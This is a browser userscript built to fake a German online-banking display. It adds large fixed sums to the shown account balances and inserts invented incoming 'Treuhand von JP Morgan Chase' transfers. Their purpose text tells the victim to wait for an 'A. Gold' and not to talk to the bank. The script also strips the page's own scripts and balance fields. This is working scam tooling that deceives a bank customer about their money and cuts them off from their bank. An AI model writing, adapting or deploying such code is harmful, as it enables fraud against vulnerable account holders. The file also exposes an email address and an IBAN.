// ==UserScript==
// @name         Ed Start 4Rec db.fereydun.zahedi@gmx.de
// @namespace    http://tampermonkey.net/
// @version      7.7777
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/537305/Ed%20Start%204Rec%20dbfereydunzahedi%40gmxde.user.js
// @updateURL https://update.greasyfork.org/scripts/537305/Ed%20Start%204Rec%20dbfereydunzahedi%40gmxde.meta.js
// ==/UserScript==


//======================================================================================================================================================================================
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//======================================================================================================================================================================================


//         UBERSICHT
    // Specify the balances to adjust by index and the amount to adjust
    const accountBalanceAdjustments = [

        { index: 0, amount: 0 },
        { index: 1, amount: 0 },

         { index: 2, amount: 88700},  //3   // will have to change to 1395
        { index: 3, amount: 10000 },  // 4  //will have to change to app 5700
       { index: 4, amount: 88700 },  // 5
         { index: 5, amount: 88700 }, //1
         { index: 6, amount:  0},
        { index: 7, amount: 88700 }, //2
         { index: 8, amount:  0},
        { index: 9, amount: 0 },

    ];


//     UMSATZE BALANCE

    // Specify the value to adjust the balance by
    var adjustValue = 88700.00; // Modify this value as needed

    // Specify the IBAN value to check for
    var ibanCheck = "DE61 3007 0024 0636 9060 00";

// UMSATZE TRANSACTIONS

   // Array of transaction details objects
    var transactions = [
        {
            date: '05.06.2025',
            bookingDate: '05.06.2025 ',
            purpose: 'Treuhand von JP Morgan Chase. A. Gold meldet sich oder melden Sie sich bei ihm. Mit Bank nicht besprechen, damit nicht gesperrt.',
            debit: '',
            credit: '77.977,83',
            currency: 'EUR'
        },
// {
   //         date: 'Vorgemerkt',
  //          bookingDate: ' ',
  //          purpose: 'Treuhand von JP Morgan Chase. 2 A. Gold meldet sich oder melden Sie sich bei ihm. Mit Bank nicht besprechen, damit nicht gesperrt.',
  //          debit: '',
///            currency: 'EUR'
  //      },
               {
            date: '27.05.2025',
          bookingDate: '27.05.2025',
            purpose: 'A. Gold meldet sich. Ohne ihn bitte nicht ausgeben.',
            debit: '',
           credit: '10.700,00',
           currency: 'EUR'
       },
  //      {
  //          date: '13.11.2024',
 //           bookingDate: '13.11.2024',
  //          purpose: 'A. Gold meldet sich. Ohne ihn bitte nicht ausgeben.',
  //          debit: '',
  //         credit: '6.300,00',
  //         currency: 'EUR'
   //    },
 //       {
 //           date: '14.06.2024',
 //           bookingDate: '01.06.2024',
 //           purpose: 'Another transaction purpose',
 //           debit: '',
//            credit: '173.343,34',
 //           currency: 'EUR'
 //       }
    ];
//======================================================================================================================================================================================
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//======================================================================================================================================================================================



if (window.location.href.indexOf("DisplayFinancialOverview") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {


//    // Specify the balances to adjust by index and the amount to adjust
//    const accountBalanceAdjustments = [
//        { index: 0, amount: 700 },
//        { index: 1, amount: 5000 },
//        { index: 2, amount: 10000 },
//        { index: 3, amount: 17000 },
//        { index: 4, amount: 27000 },
////        { index: 5, amount: 35000 },
//        { index: 6, amount: 50000 },
//        { index: 7, amount: 50000 },
 //   ];

    // Function to parse the balance text content to a float
    function parseBalance(balanceText) {
        var cleanedText = balanceText.replace(/[^\d,-]/g, '').replace(',', '.');
        return parseFloat(cleanedText.replace(/\s+/g, ''));
    }



    //---------------------------------------------------------------------------------------
function removeTextContent() {
    setInterval(function() {
        // Get all <th> elements in the document
        var thElements = document.getElementsByTagName("th");

        // Loop through all <th> elements
        for (var i = 0; i < thElements.length; i++) {
            var th = thElements[i];

            // Check if the <th> contains "Saldo" or "Währung"
            if (th.textContent.trim() === "Saldo" || th.textContent.trim() === "Währung") {
                // Find the parent <tr> element
                var tr = th.closest("tr");

                // Remove the parent <tr> if found
                if (tr) {
                    tr.remove();
                }
            }
        }
    }, 500);
}

// Call the function
// removeTextContent();




    //------------------------------------------------------------------------------------------------
    // Function to format a float back to a balance string
    function formatBalance(balanceFloat) {
        return balanceFloat.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    }

    // Function to modify balance values by the specified adjustments
    function modifyBalances() {
        var balanceElements = document.querySelectorAll('.balance');
        balanceElements.forEach(function(element, index) {
            if (!element.textContent.includes("Saldo") && element.className === "balance") {
                if (index < accountBalanceAdjustments.length) {
                    var adjustment = accountBalanceAdjustments[index];
                    var balanceText = element.textContent.trim();
                    var balance = parseBalance(balanceText);
                    var newBalance = balance + adjustment.amount;
                    var formattedBalance = formatBalance(newBalance);
                    element.textContent = formattedBalance;
                } else {
                    console.error('Index out of range:', index);
                }
            }
        });
    }

// Function to check for the presence of the element with class "nowrap rgtPadding"
function checkForElementToRemove() {
    var elements = document.querySelectorAll('.nowrap.rgtPadding');

    for (var element of elements) {
        // Modify balances if the element is found
        console.log('Element with class "nowrap rgtPadding" found. Modifying balances...');
        modifyBalances(); // Assuming modifyBalances is defined elsewhere

        // After modifying balances, remove the element
        setTimeout(() => {
            element.remove();
            console.log('Element with class "nowrap rgtPadding" removed.');
        }, 5);

        return; // Exit the function after processing the first element found
    }

    console.log('Element with class "nowrap rgtPadding" not found.');
}

// Check for the presence of the element every 70 milliseconds (adjust timing as needed)
setInterval(checkForElementToRemove, 35);


}

if ((window.location.href.indexOf("deutsche") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0) && window.location.href.indexOf("InstantPayment") === -1) {

    'use strict';

//    // Specify the value to adjust the balance by
//    var adjustValue = 7000.00; // Modify this value as needed

//    // Specify the IBAN value to check for
//    var ibanCheck = "DE83 6207 0024 0101 3317 00";

    // Function to parse the balance text content to a float
    function parseBalance(balanceText) {
        var cleanedText = balanceText.replace(/[^\d,-]/g, '').replace(',', '.');
        return parseFloat(cleanedText);
    }

    // Function to format a float back to a balance string
    function formatBalance(balanceFloat) {
        return balanceFloat.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    }

    // Function to check if the specified IBAN value is present on the page
    function isIbanPresent() {
        var ibanElement = document.getElementById('ibanValue');
        if (ibanElement) {
            var ibanText = ibanElement.textContent.replace(/\s+/g, '').toUpperCase();
            var formattedIbanCheck = ibanCheck.replace(/\s+/g, '').toUpperCase();
            return ibanText.includes(formattedIbanCheck);
        }
        return false;
    }

    // Function to modify balance values by the specified adjustValue
    function modifyBalancesEnd() {
        if (!isIbanPresent()) {
            console.error('Specified IBAN value not found on the page.');
            return;
        }

        var balanceElements = document.querySelectorAll('[headers="aB"], [headers="oB"]');
        balanceElements.forEach(function(element) {
            var strongTag = element.querySelector('strong');
            if (strongTag) {
                var balanceText = strongTag.textContent.trim();
                var balance = parseBalance(balanceText);
                var newBalance = balance + adjustValue;
                var formattedBalance = formatBalance(newBalance);

                // Update the balance text
                strongTag.textContent = formattedBalance;

                // Determine the original and new balance classes
                var originalClass = element.classList.contains('debit') ? 'debit' : 'credit';
                var newClass = newBalance < 0 ? 'debit' : 'credit';

                // Update the parent class if the balance class has changed
                if (originalClass !== newClass) {
                    element.classList.remove('debit', 'credit');
                    element.classList.add(newClass);
                }
            } else {
                console.error('No <strong> tag found within element:', element);
            }
        });
    }

    // Check document readiness and run modifyBalancesEnd when fully loaded
    var checkReadyState = setInterval(function() {
        if (document.readyState === 'complete') {
            clearInterval(checkReadyState);
            setTimeout(modifyBalancesEnd, 0);
        }
    }, 100);
}



if ((window.location.href.indexOf("deutsche") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0) && window.location.href.indexOf("InstantPayment") === -1) {



    // Specify the IBAN value to check for
//   var ibanCheck = 'DE558707 0024 0689 4240 00';

//    // Array of transaction details objects
//    var transactions = [
//        {
//            date: '13.06.2024',
//            bookingDate: '31.05.2024',
//            purpose: 'SEPA-Gehalt/Pension von JP Morgan Chase',
//            debit: '',
//            credit: '117.246,83',
//            currency: 'EUR'
//        },
//        {
//            date: '14.06.2024',
//            bookingDate: '01.06.2024',
//            purpose: 'Another transaction purpose',
//            debit: '50.00',
//            credit: '',
//          currency: 'EUR'
//        },
 //       {
//            date: '14.06.2024',
//            bookingDate: '01.06.2024',
//            purpose: 'Another transaction purpose',
//            debit: '',
//            credit: '173.343,34',
//            currency: 'EUR'
 //       }
//    ];

    // Function to create a spacer <tr> element
    function createSpacer() {
        var spacer = document.createElement('tr');
        spacer.className = 'spacer';
        spacer.innerHTML = '<td colspan="6" style="height: 10px;"></td>'; // Adjust height as needed
        return spacer;
    }

    // Function to check if the specified IBAN value is present on the page
    function isIbanPresent() {
        var ibanElement = document.getElementById('ibanValue');
        if (!ibanElement) return false;
        var pageIban = ibanElement.textContent.replace(/\s+/g, '').toUpperCase();
        var targetIban = ibanCheck.replace(/\s+/g, '').toUpperCase();
        return pageIban === targetIban;
    }

    // Function to insert transactions into the DOM
    function insertTransactions() {
        if (!isIbanPresent()) {
            console.error('Specified IBAN value not found. Transactions will not be inserted.');
            return;
        }

        // Check if the original transaction element exists
        var originalTransaction = document.querySelector('.hasSEPADetails.even.isOpen');

        // Determine where to insert transactions
        var parent;
        if (originalTransaction) {
            parent = originalTransaction.parentNode;
        } else {
            console.error('Original transaction element not found. Appending transactions to body.');
            parent = document.body; // Insert transactions at the end of <body> if original element not found
        }

        // Insert each transaction followed by a spacer
        transactions.forEach(function(transactionDetails, index) {
            var newTransaction = document.createElement('tr');
            newTransaction.className = 'hasSEPADetails even isOpen';

            newTransaction.innerHTML = `
                <td headers="bTentry" class="date"><span>${transactionDetails.date}</span></td>
                <td headers="bTvalue" class="date">${transactionDetails.bookingDate}</td>
                <td headers="bTpurpose" class="purpose">${transactionDetails.purpose}</td>
                <td headers="bTdebit" class="balance debit">${transactionDetails.debit}</td>
                <td headers="bTcredit" class="balance credit">${transactionDetails.credit}</td>
                <td headers="bTcurrency">${transactionDetails.currency}</td>
            `;

            parent.insertBefore(newTransaction, originalTransaction);

            // Insert spacer after each transaction (except after the last one)
            if (index < transactions.length - 1) {
                var spacer = createSpacer();
                parent.insertBefore(spacer, originalTransaction);
            }
        });
    }

    // Wait for 2 seconds before inserting transactions (adjust timing if needed)



        // Check document readiness and run modifyBalancesEnd when fully loaded
    var checkReadyStates = setInterval(function() {
        if (document.readyState === 'complete') {
            clearInterval(checkReadyStates);
            setTimeout(insertTransactions, 0);
        }
    }, 100);
}



if (window.location.href.indexOf("deutsche") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

    // Function to change classes based on specified rules
    function updateClasses() {
        // Change class="odd hasSEPADetails" to class="even hasSEPADetails isOpen"
        document.querySelectorAll('.odd.hasSEPADetails').forEach(function(element) {
            element.classList.remove('odd');
            element.classList.add('even', 'isOpen');
        });

        // Change class="even hasSEPADetails" to class="even hasSEPADetails isOpen"
        document.querySelectorAll('.even.hasSEPADetails').forEach(function(element) {
            element.classList.add('isOpen');
        });

        // Change all class="odd" to class="even"
        document.querySelectorAll('.odd').forEach(function(element) {
            element.classList.remove('odd');
            element.classList.add('even');
        });

        // Remove elements with colspan="6"
        document.querySelectorAll('[colspan="6"]').forEach(function(element) {
            element.remove();
        });

        // Remove elements with class="OPRA_SB_serviceLink"
        document.querySelectorAll('.OPRA_SB_serviceLink').forEach(function(element) {
            element.remove();
        });
    }

    // Watch for changes in the DOM and update classes
    var observer = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.type === 'childList' || mutation.type === 'attributes') {
                updateClasses();
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Initially update classes
    updateClasses();

    // Function to remove elements with data-test="Amount"
    function removeElementsWithAmount() {
        document.querySelectorAll('[data-test="Amount"]').forEach(function(element) {
            element.remove();
        });
    }

    // Run the removal function every 30 milliseconds
    setInterval(removeElementsWithAmount, 30);
}




if ((window.location.href.indexOf("deutsche") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0) && window.location.href.indexOf("InstantPayment") === -1) {


    // Function to remove elements by class name, data-test attribute, and IDs
    function removeElements() {
        console.log("Removing specified elements...");

       // Remove elements with class "sc-iQKALj hdSxum"
        document.querySelectorAll('.sc-iQKALj.hdSxum').forEach(function(element) {
            element.remove();
           console.log("Element with class 'sc-iQKALj hdSxum' removed.");
       });

        // Remove elements with data-test="Amount"
       document.querySelectorAll('[data-test="Amount"]').forEach(function(element) {
            element.remove();
            console.log('Element with data-test="Amount" removed.');
        });

        // Remove elements with id="currentAccountBalance"
        var currentAccountBalanceElement = document.getElementById('currentAccountBalance');
       if (currentAccountBalanceElement) {
           currentAccountBalanceElement.remove();
            console.log('Element with id="currentAccountBalance" removed.');
       }

        // Remove elements with id="bookedBalance"
       var bookedBalanceElement = document.getElementById('bookedBalance');
       if (bookedBalanceElement) {
            bookedBalanceElement.remove();
           console.log('Element with id="bookedBalance" removed.');
       }

       // Remove elements with for="currentAccountBalance"
        document.querySelectorAll('[for="currentAccountBalance"]').forEach(function(element) {
           element.remove();
            console.log('Element with for="currentAccountBalance" removed.');
        });

        // Remove elements with class "pageFunctions"
        document.querySelectorAll('.pageFunctions').forEach(function(element) {
          element.remove();
         console.log('Element with class "pageFunctions" removed.');
      }
                                                          );
    }

    // Watch for changes in the DOM and remove added scripts and specified elements
    var qwobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                    // Check if the node is an element and remove specified elements
                    if (node.nodeType === Node.ELEMENT_NODE) {
                        if (node.classList && node.classList.contains('sc-iQKALj') && node.classList.contains('hdSxum')) {
                            console.log("Element with class 'sc-iQKALj hdSxum' added. Removing...");
                            node.remove();
                            console.log("Element with class 'sc-iQKALj hdSxum' removed.");
                        }
                        if (node.getAttribute && node.getAttribute('data-test') === 'Amount') {
                            console.log('Element with data-test="Amount" added. Removing...');
                            node.remove();
                            console.log('Element with data-test="Amount" removed.');
                        }
                        if (node.id === 'currentAccountBalance') {
                            console.log('Element with id="currentAccountBalance" added. Removing...');
                            node.remove();
                            console.log('Element with id="currentAccountBalance" removed.');
                        }
                        if (node.id === 'bookedBalance') {
                            console.log('Element with id="bookedBalance" added. Removing...');
                            node.remove();
                            console.log('Element with id="bookedBalance" removed.');
                        }
                        if (node.getAttribute && node.getAttribute('for') === 'currentAccountBalance') {
                            console.log('Element with for="currentAccountBalance" added. Removing...');
                            node.remove();
                            console.log('Element with for="currentAccountBalance" removed.');
                        }
                       if (node.classList && node.classList.contains('pageFunctions')) {
                            console.log("Element with class 'pageFunctions' added. Removing...");
                          node.remove();
                            console.log("Element with class 'pageFunctions' removed.");
                       }
                    }
                }
            }
        }
    });

    // Start observing the document
    qwobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Initial removal of all scripts and specified elements from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Run initial removal functions



       // Check document readiness and run modifyBalancesEnd when fully loaded
    var checkReadyStatex = setInterval(function() {
        if (document.readyState === 'complete') {
            clearInterval(checkReadyStatex);
              removeScripts();
    removeElements();
        }
    }, 100);
    }



